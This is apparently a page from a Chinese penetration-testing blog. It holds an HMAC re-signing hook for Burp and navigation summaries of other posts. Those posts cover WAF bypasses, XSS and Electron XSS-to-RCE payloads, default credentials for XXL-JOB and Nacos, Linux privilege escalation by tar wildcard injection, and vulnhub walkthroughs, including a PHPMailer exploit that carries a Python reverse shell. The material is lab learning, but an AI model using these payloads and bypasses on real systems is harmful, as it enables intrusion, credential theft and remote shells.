import json import hmac import hashlib import typing as t from fastapi import FastAPI from _base_classes import * SECRET_KEY = b&amp;amp;#34;1234123412341234&amp;amp;#34; # 固定HMAC key（16字节） KEY_STR = SECRET_KEY.hex() # 发送到服务器时作为key字段 app = FastAPI() @app.post(&amp;amp;#34;/hookRequestToBurp&amp;amp;#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): &amp;amp;#34;&amp;amp;#34;&amp;amp;#34;客户端 -&amp;amp;gt; Burp，解密，方便Burp看到明文&amp;amp;#34;&amp;amp;#34;&amp;amp;#34; # 获取原始数据 content_dict = json.loads(request.content) # 移除签名与key content_dict.pop(&amp;amp;#34;signature&amp;amp;#34;, None) content_dict.pop(&amp;amp;#34;key&amp;amp;#34;, None) # 转回字节流 request.content = json.dumps(content_dict).encode() return request @app.post(&amp;amp;#34;/hookRequestToServer&amp;amp;#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): &amp;amp;#34;&amp;amp;#34;&amp;amp;#34;Burp -&amp;amp;gt; Server，加密，加上HMAC签名&amp;amp;#34;&amp;amp;#34;&amp;amp;#34; # 解析原始数据 content_dict = json.loads(request.content) # 构造待签名字符串（如 username=admin&amp;amp;amp;password=123456） sign_str = &amp;amp;#34;&amp;amp;amp;&amp;amp;#34;.join(f&amp;amp;#34;{k}={v}&amp;amp;#34; for k, v in content_dict.items()) signature = hmac_sha256(sign_str.encode(), SECRET_KEY) # 构造新结构 content_dict[&amp;amp;#34;signature&amp;amp;#34;] = signature content_dict[&amp;amp;#34;key&amp;amp;#34;] = KEY_STR request.content = json.dumps(content_dict).encode() return request @app.post(&amp;amp;#34;/hookResponseToBurp&amp;amp;#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): &amp;amp;#34;&amp;amp;#34;&amp;amp;#34;Server -&amp;amp;gt; Burp，不涉及解密，直接透传&amp;amp;#34;&amp;amp;#34;&amp;amp;#34; return response @app.post(&amp;amp;#34;/hookResponseToClient&amp;amp;#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): &amp;amp;#34;&amp;amp;#34;&amp;amp;#34;Burp -&amp;amp;gt; Client，不涉及加密，直接透传&amp;amp;#34;&amp;amp;#34;&amp;amp;#34; return response def hmac_sha256(data: bytes, key: bytes) -&amp;amp;gt; str: mac = hmac.new(key, data, hashlib.sha256) return mac.hexdigest() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: import uvicorn uvicorn.run(app, host=&amp;amp;#34;0.0.0.0&amp;amp;#34;, port=8003) 运行hook：
">yakit实验室-高级前端加解密与验签实战通关记录</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/js%E5%AF%B9%E6%8A%97/%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%AB%99%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86-galaxy%E4%BD%BF%E7%94%A8/" class="article-link" data-summary="网站流量加解密场景入门&amp;amp;amp;Galaxy使用 这里使用的Galaxy开发者的网站demo做测试，场景比较简单，入门够用
网站加解密分析 可以看见网站有对于username的query功能：
请求后查看request和response：
发现请求和返回都加了密，可以看见这里是以POST方法请求/api/des-cbc/getUserInfo路由，所以在浏览控制台设置xhr断点拦截该路由的POST请求：
再次点击query发现请求停在了断点处，且可以看到加解密的信息：
加密代码如下，我们甚至可以看到data加密前的值：
解密代码在请求之后：
分析代码，可以得出结论：
des加密
key为12345678
iv为12345678
CBC模式
padding为Pkcs7
galaxy自动加解密 接下来是工具hook部分，我使用的是galaxy，当然autodecoder也可以试试（我还没学）： 我这里选择jython的hooker，模式即des_cbc，hooker中的参数按照上面分析出来的进行设置即可:
配置好直接start，接下来我们就可以对加密的流量包进行解密了：
例如选择decrypt request，即可得到明文请求：
响应也是同理： 此时，我们再将网页请求代理到burp即可发现请求和响应都已经被自动解密：
同理，在这个基础上可以将有加密的包send to sqlmap（galaxy自带的功能，此时galaxy是sqlmap和服务端的中间人，能够自动进行流量加解密），这个就不多介绍了
">网站流量加解密-galaxy使用</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>waf对抗</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/waf%E5%AF%B9%E6%8A%97/waf%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="waf笔记 记录一下攻防演练中waf相关见闻
常见漏洞通用bypass 常见漏洞中一些通用的值得尝试的方法
shiro 一位师傅说的：
一部分shiro相关waf有一个检测步骤：
将rememberMe的值用最常见的默认key去尝试解密，然后查看是否有敏感参数比如命令执行语句
所以默认key的shiro攻击很容易被waf
将请求包的method改为随机字符串，比如GET改为xxxxT method置空，比如直接删掉GET 脏数据，在cookie的rememberMe=后面增加一些特殊字符.或`（因为shiro处理点号、反引号等会直接去除） 空白字段，在rememberMe=中添加&amp;amp;quot;tab&amp;amp;quot;锁进变为rememberMe	= Host头的域名改为IP能绕过一部分只防护域名的云waf 常见waf 由于一直试通用的bypass比较费时间，所以记住一些常见waf的特性肯定会事半功倍
电信云堤 打shiro遇到的：
师傅说这个waf和大部分云waf都有个特性就是有可能只防护了域名，对此的bypass手法就是在请求包host头中把域名改成真实IP
奇安信网站卫士 默认key打shiro偶遇的，拼尽全力无法战胜
">waf笔记</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/waf%E5%AF%B9%E6%8A%97/xss_tricks/" class="article-link" data-summary="XSS_tricks 记录一些适用于bypass waf的XSS小tricks
以及一些不是很容易想到的可以测试XSS的场景
巧用反引号 该trick来自于0xsdeo师傅的Spade sec公众号
反引号可以达到一个不用括号的效果，很适合用于()括号被转义后的情况
比如下面几个demo：
控制台输出：
&amp;amp;lt;script&amp;amp;gt;console.log`1`;&amp;amp;lt;/script&amp;amp;gt; 弹窗：
&amp;amp;lt;script&amp;amp;gt;alert`1`;&amp;amp;lt;/script&amp;amp;gt; 在这里，反引号引起来的内容叫做模板字面量，又称模板字符串，在es6中一般用来字符串插值：
let name = &amp;amp;#39;Yuy0ung&amp;amp;#39;; `hello ${name}` 效果如下：
在除了这种用法外，就是我们payload的用法了，即配合默认或自定义标签函数
那么，除了弹窗和控制台输出，获取cookie就需要再构造一下了，思路和上面的字符串插值很像：
console.log`${document.cookie}` 可以注意到这里有一个多余的数组，具体原因可以查阅es6文档，这里不做赘述
当然这个数组会导致我们使用alet弹不出cookie，所以推荐使用console.log
**总结：**上面的payload优势在于反引号、$、{}三种符号不容易被转义，巧用了模板字面量的特性
文件上传XSS的content-type绕过 除了常规的text/html的content-type，还可以有一些其他的：
text/htm htm/text html/text 都可以试一试，主要基于后端的配置，在思考bypass的时候可以从这方面进行思考
可能存在XSS的非常规场景 OCR服务处 比如有些功能点支持OCR识别发票文字内容并输出，那么我们可以在图片上P一个XSS的payload进行测试，这是一个很巧妙的思路
hidden标签处 F12全局搜索hidden标签，可能找到一些不显示但是内容可控的标签，比如用于页面跳转功能的隐藏标签，比如下面这个demo：
name是ReturnUrl，这里尝试直接GET传参：
发现value可控，那么就可以尝试构造闭合：
可以看见成功闭合了，那么接下来就是直接打XSS：
">XSS_tricks</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>常见服务</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/%E5%85%B3%E4%BA%8Eelectron-xss2rce%E7%9A%84%E7%A0%94%E7%A9%B6/" class="article-link" data-summary="关于electron XSS2RCE的研究 每次听见XSS2RCE，第一反应都是：客户端？electron？不过一直是知其然不知其所以然，于是现在来仔细了解一下其中的原理
多进程通信 Electron采用多进程架构，有两种进程：
主进程（Main Process）：拥有完整系统权限，负责窗口管理、原生API调用，它运行在Node.js环境中,拥有完整的系统访问权限,可以执行任意系统命令、访问文件系统
渲染进程（Renderer Process）：基于Chromium的网页环境，处理UI渲染，只有受限的权限
两者通过IPC（进程间通信） 机制交互，但默认配置下，这种通信缺乏严格的权限校验
到这里，我们其实可以简单理解其架构为浏览器内核&#43;Node.js
安全配置项 一些错误的配置会导致漏洞风险的增加：
nodeIntegration: true：直接在渲染进程中启用Node.js环境，即让渲染进程里的网页代码可以直接使用完整的 Node.js 环境，包括对文件、操作系统的控制功能
contextIsolation: false：关闭上下文隔离，preload 脚本、网页脚本、Electron 内部扩展共享同一个 V8 全局上下文，互相可见可调用
enableRemoteModule: true：该机制允许渲染进程通过 remote 调用主进程能力，已被官方明确标记为不推荐使用，并在新版本中逐步弃用
XSS到RCE的利用 我们到这里已经大致能想到攻击链路了，即通过在渲染进程触发XSS，并尝试通过XSS来控制Node API，实现对系统的访问控制
我写了一个markdown文本编辑器来模拟electron应用，用户可以输入md语法格式的文本：
点击preview可以预览解析md后的文本样式：
最理想的情况 我在代码开启了危险配置： 由于这两个条件均开启，页面 JS 可以直接调用 Node.js 的 require，此时可以利用child_process 模块执行系统命令，实现 RCE，这里选择弹计算器的payload：
&amp;amp;lt;img src=x onerror=&amp;amp;#34;require(&amp;amp;#39;child_process&amp;amp;#39;).exec(&amp;amp;#39;open -a Calculator&amp;amp;#39;)&amp;amp;#34;&amp;amp;gt; 点击预览，可以看到这里成功触发了XXS2RCE：
关闭nodeIntegration 接下来是关闭nodeIntegration的情况：
利用方法会比较苛刻一点，我们可以利用暴露的IPC接口，例如我在代码做了如下实现：
可以看到这里有一个用于读文件的IPC，而这个IPC又被暴露了出来：
那么我们可以通过XSS发送构造好的IPC消息来读文件，这里payload选择读取/etc/passwd文件：
&amp;amp;lt;img src=x style=&amp;amp;#34;display:none&amp;amp;#34; onerror=&amp;amp;#34;ipcRenderer.send(&amp;amp;#39;read-file&amp;amp;#39;, &amp;amp;#39;/etc/passwd&amp;amp;#39;)&amp;amp;#34;&amp;amp;gt; 此时点击预览就会触发XSS，实现读文件操作： 启用contextIsolation 在此基础上，如果启用了contextIsolation呢？事实上，如果关闭了 sandbox 并且 Preload 脚本写得不安全，也会存在安全风险：
">关于electron XSS2RCE的研究</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/%E5%86%85%E7%BD%91%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-link" data-summary="内网常见服务的漏洞总结 由于6s6师傅在面试杭州某60时被拷打了很多内网常见服务的漏洞，我觉得还是得上手实操并总结一下，于是有了这篇笔记
XXL-JOB 介绍 xxl-job是一个分布式任务调度平台，有两个核心模块：
调度中心admin，默认端口8080，负责管理调度信息等操作 执行器executor，默认端口9999，负责任务执行，接收调度中心的请求 特征 fofa语法：
icon_hash=&amp;amp;#34;1691956220&amp;amp;#34; || app=&amp;amp;#34;xxl-job&amp;amp;#34; 页面特征：
图标特征：
常见漏洞 弱口令 xxl-job的初始化sql语句设定了默认密码admin/123456，并且登录后不会提示修改默认密码
这样可以直接进入后台： 后台计划任务getshell 登录成功后可以在任务管理处创建计划任务： 在GLUEIDE处编辑命令：
写入反弹shell的命令：
然后回到管理页面选择执行一次：
即可反弹shell：
Executor Restful API未授权访问RCE 前面提到了xxl-job分为admin和executor，而executor默认没有配置认证，未授权的攻击者可以通过RESTful API执行任意命令
默认accessToken身份绕过 也是一个很经典的漏洞场景，accessToken是为了修复XXL-JOB Executor Restful API 未授权访问命令执行漏洞，为了防止其未授权添加了accessToken校验，但是很多人在使用该框架的时候并未修改其默认的值xxl.job.accessToken=default_token，所以只需要在请求头中添加XXL-JOB-ACCESS-TOKEN: default_token 即可绕过身份校验
api未授权Hessian2反序列化 即xxl-job的/api路由可以未授权访问，而该接口会进行Hessian2反序列化操作，可以利用Hessian2反序列化漏洞进行RCE
未授权情况的API界面如下
一把梭命令执行：
Nacos 介绍 Nacos是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台，由阿里巴巴开源，一般在内网系统中比较常见
nacos部署需要开放以下端口：
主端口：默认8848，管理页面的主入口 gRPC服务客户端端口：默认9848，用于客户端向服务端发起gRPC连接和请求 gRPC服务服务端端口：默认9849，用于服务间的数据同步和其他服务端之间的通信 Jraft请求服务端端口：默认为7848，用于处理服务端间的Raft相关请求，比如集群管理中的选主和日志复制等 特征 fofa语法：
app=&amp;amp;#34;nacos&amp;amp;#34; &amp;amp;amp;&amp;amp;amp; port=&amp;amp;#34;8848&amp;amp;#34; || icon_hash=&amp;amp;#34;13942501&amp;amp;#34;||icon_hash=&amp;amp;#34;1227052603&amp;amp;#34; &amp;amp;amp;&amp;amp;amp; port=&amp;amp;#34;8848&amp;amp;#34; 页面特征：
图标特征：
">内网常见服务的漏洞总结</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>接口测试</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/graphql%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" class="article-link" data-summary="浅谈GraphQL渗透测试 前置知识 GraphQL概念 GraphQL是一个用于 API的查询语言，下面我用通俗的语言来谈谈它的特点：
简单说，GraphQL 是一种“灵活取数据”的工具。比如你点外卖时，可以自由组合菜品，而不用按固定套餐点。GraphQL 的作用类似：前端可以按需“点”数据，后端精准返回
那么这里就可以看出GraphQL与传统Rest API的区别了，我们同样以”点外卖“来描述：
Rest API：固定套餐，比如
套餐A：用户信息（姓名、头像） 套餐B：用户的朋友列表 套餐C：用户的订单记录 那么可以看出来它的局限：如果你想同时要“用户姓名”和“朋友列表”，得点两次套餐（发两次请求），或者让后端临时做个新套餐（改接口）
GraphQL：自助餐，想要什么直接通过接口告诉后端，比如下面这个请求：
query { user { name # 只要姓名 friends { # 和朋友列表 name } } } 这个请求能够，一次精准拿到 name 和 friends 数据，不会多拿（比如不需要头像），也不会少拿
通过上面的描述，我们能够知道GraphQL API与Rest API最大的区别：GraphQL 通过将数据查询和数据修改分离开来，使得客户端能够更灵活地控制所需数据的粒度和类型，并且在多个资源之间建立关系
GraphQL查询方式 查询方式主要有：
Query Mutation Subscription Input Enum Union Interface 最常见的是Query、Mutation、Subscription三种，这里简单举例：
Query（查询） 用于获取数据，只读取不修改：
query 操作名称(可选参数) { 字段名(参数) { 子字段 } } Mutation（变更） 用于修改数据，属于写操作，会改变服务器状态：
">GraphQL渗透测试学习</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/vuewebpack%E6%A1%86%E6%9E%B6%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/" class="article-link" data-summary="浅谈VUE&#43;webpack框架测试技巧 主要记录针对vue和webpack的测试技巧
基础知识 Vue.js 是一个渐进式 JavaScript 框架，用于构建用户界面，学过一点点前端便很好理解：
原生JS：要手动抓取DOM元素，用addEventListener监听点击，自己计算总价并更新页面 Vue：你只要写好数据 cartItems 和 totalPrice，界面会自动跟着变化 而 Webpack 是一个模块打包工具，用于将项目中的各种资源（如 JavaScript 模块、CSS 样式文件、图片等）打包成浏览器可以识别的文件，同样很好理解：
假设一个大型项目，前端的文件：
100 份JS文件 50 份CSS文件 200 种图片字体等 正常加载的话可能需要浏览器发几百个请求，而Webpack可以很好的整合打包，一次性加载，显著降低请求的压力，比如说：
你写了一个 .vue 文件（包含HTML/JS/CSS） ↓ Webpack 用 vue-loader 拆解成三部分 ↓ JS部分交给Babel转译 CSS部分交给PostCSS加前缀 ↓ 最后合并成 1个app.js 和 1个style.css ↓ 浏览器只需加载2个文件就能运行整个应用
框架测试 接下来分析针对vue&#43;webpack这类网站的测试技巧
特征识别 最简单就是看url中是否有/#/，如果有，很可能就是vue站点
首先就是我们常用的浏览器插件Wappalyzer，可以快速识别网站是否使用了webpack或vue技术：
其次学习过vue开发的就知道还有一款用于vue测试的插件Vue.js devtools，同样可以识别网站前端是否为vue：
正常情况下插件为灰色：
若网站使用了vue，插件图标则会亮起：
我们也可以F12查看网页加载的js文件来判断，通常是一个或少量app.xxx.js和一大堆chunk-xxx.js文件：
API接口和路由获取 常规插件 首先肯定非常方便的插件findsomething，能将加载出的js中的路由识别并列出： 也有类似的其他工具，比如burp的HAE、BurpJSLinkFinder等插件
JS文件 首先查看的就是app.xxx.js，通过搜索关键字（比如path:&amp;amp;quot;）可能会找到一些路由：
上面提到了chunk结构的打包文件，在低权限状态下，有些js不会自动加载，往往这类js可能会存在大量接口和敏感信息，一般来说可以进入app.js这类文件查看所有的chunk-xxx.js：
这里我们可以写一个脚本处理这些chunk为对应url，再进行批量访问，配合burp插件等寻找隐藏接口**（比如httpx代理到burp，配合jslinkfinder和Hae进行处理）**，可以扩大攻击面：
">VUE&amp;webpack框架测试技巧</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>靶场笔记</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E4%BA%91%E5%B0%98%E9%9D%B6%E5%9C%BA-linux%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/" class="article-link" data-summary="云尘靶场-Linux提权系列WP Linux提权系列-1 ssh连接靶机，首先进行基本的信息收集：
发现当前ctf用户可以免密sudo，以user1的身份执行/bin/bash，很经典的sudo提权嘛，直接来：
sudo -u user1 /bin/bash 成功获取到user1的BashShell，看看当前目录有什么：
成功拿到了flag
Linux提权系列-2 ssh连接靶机，首先进行基本的信息收集：
发现suid权限配置不当，find命令拥有了suid权限，看看find的所有者：
所有者为user2，意味着可以提权到user2，那么直接用find提权：
find .profile -exec /bin/bash -p \; 轻松提权到user2
进入/home/user2看看：
成功拿到flag
Linux提权系列-3 在信息收集时发现存在user3用户的定时任务： 看看定时任务脚本内容：
这里的tar命令使用了通配符，可以考虑通配符注入进行提权
首先创建/tmp/abcd/路径：
mkdir /tmp/abcd 然后创建利用文件和脚本，并赋予权限：
echo &amp;amp;#39;/usr/bin/cp /usr/bin/find /tmp/myfind &amp;amp;amp;&amp;amp;amp; chmod 4777 /tmp/myfind&amp;amp;#39; &amp;amp;gt; exploit.sh &amp;amp;amp;&amp;amp;amp; echo &amp;amp;#39;&amp;amp;#39; &amp;amp;gt; &amp;amp;#39;--checkpoint=1&amp;amp;#39; &amp;amp;amp;&amp;amp;amp; echo &amp;amp;#39;&amp;amp;#39; &amp;amp;gt; &amp;amp;#39;--checkpoint-action=exec=sh exploit.sh&amp;amp;#39; &amp;amp;amp;&amp;amp;amp; chmod 777 /tmp/abcd/* 接下来等待定时任务执行时触发*的通配符注入，得到所有者为user3，且具有suid权限的/tmp/myfind：
得到后即可用find进行suid提权获得user3的shell
直接读flag即可：
Linux提权系列-4 首先信息收集一波：
发现两个免密sudo的玩意，直接先获取一个user1的shell：
">云尘靶场-Linux提权系列</a>
        
      </div>
    </li>
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>vulnhub</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/vulnhub-raven2%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="vulnhub-Raven:2 渗透记录 本次渗透测试靶机为vulnhub的Raven:2，目的是学习了UDF提权后，进行的实操巩固
靶场共有4个flag
信息搜集（flag1） 首先nmap扫描一下eth0网卡的c端找到靶机IP：
nmap -sP -sn 192.168.111.1/24 发现靶机IP为192.168.111.141:
对其进行端口扫描：
nmap -sV -A -T4 192.168.111.141 可以发现靶机开放了22、80、111三个端口：
访问80端口发现是个网页：
考虑用dirsearch扫一下目录：
dirsearch -u http://192.168.111.141/ 发现有几个可访问的路径，尝试访问：
访问/.DS_Store可以下载该文件，访问文件可以知道web目录里面所有文件的清单
/vendor/路由存在目录遍历：
访问其中的PATH文件拿到了第一个flag：
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21} 通过刚才目录遍历的文件名，可知网站应该是安装了PHPmailer，而遍历到的version文件中写了5.2.16，猜测这可能就是PHPmailer版本号
在kali中搜索对应漏洞：
searchsploit phpmailer 这里选择能RCE的php/webapps/40974.py，查看下exp：
searchsploit -x exploits/php/webapps/40974.py 在exploit-db上查询可知该漏洞的编号为CVE-2016-10033，是因为邮件地址能够包含用引号括起来的空格，这样可以进行攻击参数的注入
而我们通过dirsearch或网站主页上看到的邮件页面地址为：http://192.168.61.135/contact.php，因此可以尝试漏洞利用
漏洞利用（flag2、flag3） 接下来我们把EXP下载到桌面进行编辑：
searchsploit -m exploits/php/webapps/40974.py 修改内容如下：
开头加上：
#!/usr/bin/python # -*- coding: utf-8 -*- target值改为http://192.168.111.141/contact.php
backdoor值改为houmen.php（默认的名字容易被ban）
修改payload和fields：
payload = &amp;amp;#39;&amp;amp;lt;?php system(\&amp;amp;#39;python -c &amp;amp;#34;&amp;amp;#34;&amp;amp;#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&amp;amp;#39;[kali的IP]\\\&amp;amp;#39;,[监听的端口]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&amp;amp;#34;/bin/sh\\\&amp;amp;#34;,\\\&amp;amp;#34;-i\\\&amp;amp;#34;])&amp;amp;#34;&amp;amp;#34;&amp;amp;#34;\&amp;amp;#39;); ?&amp;amp;gt;&amp;amp;#39; fields={&amp;amp;#39;action&amp;amp;#39;: &amp;amp;#39;submit&amp;amp;#39;, &amp;amp;#39;name&amp;amp;#39;: payload, &amp;amp;#39;email&amp;amp;#39;: &amp;amp;#39;&amp;amp;#34;anarcoder\\\&amp;amp;#34; -OQueueDirectory=/tmp -X/[web路径]/[后门文件名称].php server\&amp;amp;#34; @protonmail.com&amp;amp;#39;, &amp;amp;#39;message&amp;amp;#39;: &amp;amp;#39;Pwned&amp;amp;#39;} ">vulnhub-Raven2靶场笔记</a>
        
      </div>
    </li>
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>DC</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-1%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="DC-1渗透笔记 信息搜集 探测IP nmap扫一下：
nmap -sP 192.168.111.0/24 发现IP为192.168.111.143
端口探测 nmap扫描所有端口的信息：
nmap -sV -p- 192.168.111.143 可以看见开放了：
22端口
80端口
111端口
49525端口
这里80端口和22端口可能比较重要，我先从80端口的web服务入手
网页信息搜集 浏览器访问80端口：
需要登录，没什么头绪，再看看有没有其他利用点
用wappalyzer可以看见cms、语言、中间件、操作系统等基本信息：
Drupal 7 PHP 5.4.45 Apache 2.2.22 debian 跑一下目录看看：
dirsearch -u 192.168.111.143 扫到很多目录但是作用不是很大
漏洞利用 首先从cms入手看看有没有历史漏洞，搜索一下还真有个18年的CVE
直接上msf看看有没有现成的脚本：
search Drupal 应该就是18年那个了，use一下，填好参数直接开打：
这就拿shell了，好快
后渗透 获取交互式shell（flag1、flag2） 输入shell即可进入linux的shell，就是有点丑
老规矩，试试用python获取一个pty
python -c &amp;amp;#39;import pty; pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;)&amp;amp;#39; OK了，看来是装了python的：
这里有个flag1.txt，cat一下：
翻译一下：每个好的CMS都需要一个配置文件，你也一样
那这里就是告诉我下一步得去看这个drupal cms的配置文件了
看看有没有settings.php：
还真是，直接cat看看：
这里获得了flag2：暴力破解和字典攻击并不是获取访问权限（而你肯定需要访问权限）的唯一方式。有了这些凭证，你能做什么？
而下面还给出了mysql数据库的账密，很明显下一步要进数据库了
">DC-1渗透笔记</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-2%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="vulnhub-DC:2渗透笔记 信息搜集 IP探测 老规矩，先探测一下IP：
nmap -sP 192.168.111.0/24 确定IP为192.168.111.144
端口探测 看看开了哪些端口：
nmap -sV -p- 192.168.111.144 可以看到开放了两个端口：
80端口，这个应该就是web服务 7744端口，似乎是把ssh服务默认的22改成了7744 网页信息收集 浏览器访问80端口看看：
不能访问，但显示了个dc-2，这里涉及一个dns解析顺序的问题：
根据Windows系统规定，在进行DNS请求以前，Windows系统会先检查自己的Hosts文件中是否有这个地址映射关系，如果有则调用这个IP地址映射，如果没有再向已知的DNS服务器提出域名解析。 也就是说Hosts的请求级别比DNS高 所以我们修改C:/Windows/System32/drivers/etc/HOSTS文件进行host碰撞：
ok现在再访问一下进入web服务：
可以访问了且发现了flag1：
你通常使用的字典可能行不通，所以也许你需要使用cewl。 更多的密码总是更好，但有时你就是无法赢得所有的。 登录为一个用户来查看下一个flag 如果找不到它，尝试以另一个身份登录 他这里应该是让我使用cewl进行密码攻击，但并不代表只有这种方法，我们接着看看
依旧是通过wappalyzer得到web服务的基本信息：
wordpress 4.7.10 php语言 Apache debian系统 mysql数据库 还是dirsearch扫一扫目录：
没有什么特别有用的信息
漏洞利用 wordpress（flag1、flag2） 根据提示使用kali自带的cewl生成密码字典：
cewl http://dc-2/ -w dict.txt	//保存在dict.txt中 这个txt作为我们后续爆破用的字典
接下来按照flag1的提示，是要进行登录，针对wordpress一般可以试试wpscan：
用wpscan枚举一下用户名
wpscan --url http://dc-2/ --enumerate u 发现三个用户名，我们同样将他们保存至user.txt
接下来是针对用户的密码爆破，用户名和密码的字典指定为我们保存的字典：
wpscan --url http://dc-2/ -U user.txt -P dict.txt 可以看见，jerry和tom的密码都被爆破出来了，让我们登录试试
">DC-2渗透笔记</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-3%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="DC-3.2渗透笔记 信息搜集 IP探测 端口探测 发现只有80端口开启，那就直接看看web服务
网页信息搜集 这里最重要的信息就是这个cms模板是joomla
扫一下目录：
可以发现/administrator/是后台：
在README.txt中记录了版本号为3.7
查一下有没有漏洞：
ok存在sql注入，准备利用
漏洞利用 SQL注入 方法一：sqlmap 看看漏洞细节描述：
还是个CVE，这里连sqlmap的命令都给出来了，直接跑一手sqlmap
跑出来5个数据库，再按常规流程梭一下：
爆当前库名：
sqlmap -u &amp;amp;#34;http://192.168.40.159/index.php?option=com_fields&amp;amp;amp;view=fields&amp;amp;amp;layout=modal&amp;amp;amp;list[fullordering]=updatexml&amp;amp;#34; --risk=3 --level=5 --random-agent -p list[fullordering] --current-db 库名为joomladb
爆表名：
